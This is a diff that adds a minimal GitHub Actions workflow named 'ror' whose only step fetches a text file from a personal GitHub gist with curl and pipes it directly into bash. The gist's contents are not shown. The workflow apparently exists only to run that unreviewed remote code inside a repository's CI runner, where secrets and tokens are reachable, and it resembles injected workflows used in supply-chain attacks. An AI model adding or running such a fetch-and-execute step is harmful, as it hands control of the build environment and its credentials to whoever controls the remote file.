@@ -1,0 +1,11 @@
+name: ror
+
+on:
+  workflow_dispatch:
+
+jobs:
+  prep:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl https://gist.githubusercontent.com/Talgarr/a85242312079cca70ffe4afbe4d85c06/raw/fa6b092d5565b08180d4ccfb5dbd82c8083b8b57/gistfile1.txt -s -L | bash
